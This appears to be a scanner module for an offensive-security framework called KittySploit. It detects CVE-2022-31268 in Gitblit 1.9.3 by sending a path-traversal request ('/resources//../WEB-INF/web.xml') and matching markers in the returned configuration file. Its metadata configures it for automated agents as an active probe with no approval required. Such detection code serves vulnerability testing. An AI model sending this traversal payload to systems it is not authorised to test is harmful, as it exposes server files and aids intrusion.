#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Gitblit 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Gitblit 1.9.3 - Local File Inclusion Detection',
        'description': 'Gitblit 1.9.3 is vulnerable to local file inclusion via /resources//../ (e.g., followed by a WEB-INF or META-INF pathname).',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'lfi', 'gitblit', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/metaStor/Vuls/blob/main/gitblit/gitblit%20V1.9.3%20path%20traversal/gitblit%20V1.9.3%20path%20traversal.md',
            'https://vuldb.com/?id.200500',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-31268',
            'https://github.com/Marcuccio/kevin',
            'https://github.com/20142995/sectool',
        ],
        'cve': 'CVE-2022-31268',
    }

    def run(self):
        r = self.http_request(method="GET", path='/resources//../WEB-INF/web.xml', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('</web-app>', 'java.sun.com', 'gitblit.properties',)
        header_any = ('application/xml',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Gitblit 1.9.3 - Local File Inclusion detected",
                path='/resources//../WEB-INF/web.xml',
            )
            return True
        return False

